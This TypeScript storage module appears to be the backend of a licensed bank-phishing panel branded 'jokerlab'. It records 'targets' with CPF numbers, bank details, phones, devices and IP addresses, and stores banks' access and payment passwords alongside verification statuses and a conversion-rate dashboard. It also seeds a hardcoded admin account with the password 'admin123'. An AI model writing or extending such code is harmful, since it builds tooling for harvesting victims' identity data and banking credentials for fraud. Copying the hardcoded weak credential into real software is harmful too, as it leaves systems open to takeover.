import { type Admin, type InsertAdmin, type User, type InsertUser, type Target, type InsertTarget, type Bank, type InsertBank, type Verification, type InsertVerification } from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  // Admin methods
  getAdmin(id: string): Promise<Admin | undefined>;
  getAdminByEmail(email: string): Promise<Admin | undefined>;
  createAdmin(admin: InsertAdmin): Promise<Admin>;

  // User methods
  getUser(id: string): Promise<User | undefined>;
  getAllUsers(): Promise<User[]>;
  createUser(user: InsertUser): Promise<User>;
  updateUser(id: string, user: Partial<InsertUser>): Promise<User | undefined>;
  deleteUser(id: string): Promise<boolean>;

  // Target methods
  getAllTargets(): Promise<Target[]>;
  createTarget(target: InsertTarget): Promise<Target>;
  deleteTarget(id: string): Promise<boolean>;

  // Bank methods
  getAllBanks(): Promise<Bank[]>;
  createBank(bank: InsertBank): Promise<Bank>;
  updateBank(id: string, bank: Partial<InsertBank>): Promise<Bank | undefined>;
  deleteBank(id: string): Promise<boolean>;

  // Verification methods
  getAllVerifications(): Promise<Verification[]>;
  updateVerificationStatus(id: string, status: string): Promise<Verification | undefined>;

  // Dashboard metrics
  getDashboardMetrics(): Promise<{
    totalTargets: number;
    uniqueVisitors: number;
    activeLicenses: number;
    conversionRate: number;
    totalBanks: number;
  }>;
}

export class MemStorage implements IStorage {
  private admins: Map<string, Admin>;
  private users: Map<string, User>;
  private targets: Map<string, Target>;
  private banks: Map<string, Bank>;
  private verifications: Map<string, Verification>;

  constructor() {
    this.admins = new Map();
    this.users = new Map();
    this.targets = new Map();
    this.banks = new Map();
    this.verifications = new Map();

    // Create default admin
    this.createAdmin({
      email: "admin@jokerlab.app",
      password: "admin123", // In production, this should be hashed
    });
  }

  // Admin methods
  async getAdmin(id: string): Promise<Admin | undefined> {
    return this.admins.get(id);
  }

  async getAdminByEmail(email: string): Promise<Admin | undefined> {
    return Array.from(this.admins.values()).find(admin => admin.email === email);
  }

  async createAdmin(insertAdmin: InsertAdmin): Promise<Admin> {
    const id = randomUUID();
    const admin: Admin = { 
      ...insertAdmin, 
      id,
      createdAt: new Date(),
    };
    this.admins.set(id, admin);
    return admin;
  }

  // User methods
  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getAllUsers(): Promise<User[]> {
    return Array.from(this.users.values());
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const user: User = { 
      ...insertUser, 
      id,
      status: insertUser.status || "active",
      createdAt: new Date(),
    };
    this.users.set(id, user);
    return user;
  }

  async updateUser(id: string, updateData: Partial<InsertUser>): Promise<User | undefined> {
    const user = this.users.get(id);
    if (!user) return undefined;

    const updatedUser = { ...user, ...updateData };
    this.users.set(id, updatedUser);
    return updatedUser;
  }

  async deleteUser(id: string): Promise<boolean> {
    return this.users.delete(id);
  }

  // Target methods
  async getAllTargets(): Promise<Target[]> {
    return Array.from(this.targets.values());
  }

  async createTarget(insertTarget: InsertTarget): Promise<Target> {
    const id = randomUUID();
    const target: Target = { 
      ...insertTarget, 
      id,
      name: insertTarget.name || null,
      cpf: insertTarget.cpf || null,
      bankId: insertTarget.bankId || null,
      bankDetails: insertTarget.bankDetails || null,
      phone: insertTarget.phone || null,
      device: insertTarget.device || null,
      ipAddress: insertTarget.ipAddress || null,
      createdAt: new Date(),
    };
    this.targets.set(id, target);
    return target;
  }

  async deleteTarget(id: string): Promise<boolean> {
    return this.targets.delete(id);
  }

  // Bank methods
  async getAllBanks(): Promise<Bank[]> {
    return Array.from(this.banks.values());
  }

  async createBank(insertBank: InsertBank): Promise<Bank> {
    const id = randomUUID();
    const bank: Bank = { 
      ...insertBank, 
      id,
      accessPassword: insertBank.accessPassword || null,
      paymentPassword: insertBank.paymentPassword || null,
      icon: insertBank.icon || null,
      createdAt: new Date(),
    };
    this.banks.set(id, bank);
    return bank;
  }

  async updateBank(id: string, updateData: Partial<InsertBank>): Promise<Bank | undefined> {
    const bank = this.banks.get(id);
    if (!bank) return undefined;

    const updatedBank = { ...bank, ...updateData };
    this.banks.set(id, updatedBank);
    return updatedBank;
  }

  async deleteBank(id: string): Promise<boolean> {
    return this.banks.delete(id);
  }

  // Verification methods
  async getAllVerifications(): Promise<Verification[]> {
    return Array.from(this.verifications.values());
  }

  async createVerification(insertVerification: InsertVerification): Promise<Verification> {
    const id = randomUUID();
    const verification: Verification = { 
      ...insertVerification, 
      id,
      status: insertVerification.status || "pending",
      createdAt: new Date(),
    };
    this.verifications.set(id, verification);
    return verification;
  }

  async updateVerificationStatus(id: string, status: string): Promise<Verification | undefined> {
    const verification = this.verifications.get(id);
    if (!verification) return undefined;

    const updatedVerification = { ...verification, status };
    this.verifications.set(id, updatedVerification);
    return updatedVerification;
  }

  // Dashboard metrics
  async getDashboardMetrics() {
    const totalTargets = this.targets.size;
    const totalBanks = this.banks.size;
    
    return {
      totalTargets,
      uniqueVisitors: 0, // This would come from analytics
      activeLicenses: 0, // This would come from license system
      conversionRate: totalTargets > 0 ? 0.0 : 0.0,
      totalBanks,
    };
  }
}

export const storage = new MemStorage();
